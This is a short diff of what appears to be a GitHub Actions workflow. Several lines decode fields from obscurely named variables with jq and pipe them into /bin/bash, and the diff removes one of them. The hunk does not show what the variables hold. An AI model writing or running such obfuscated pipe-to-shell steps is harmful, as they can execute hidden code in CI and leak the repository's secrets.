@@ -24,7 +24,6 @@ jobs:
           echo $slh323 | jq -r .b1 | /bin/bash
           echo $c3122 | jq -r .kz972 | /bin/bash
           printf '%s' "$zzlij4" | jq -r .xx1 | /bin/bash
-          printf '%s' "$w0" | jq -r .tjoi32 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
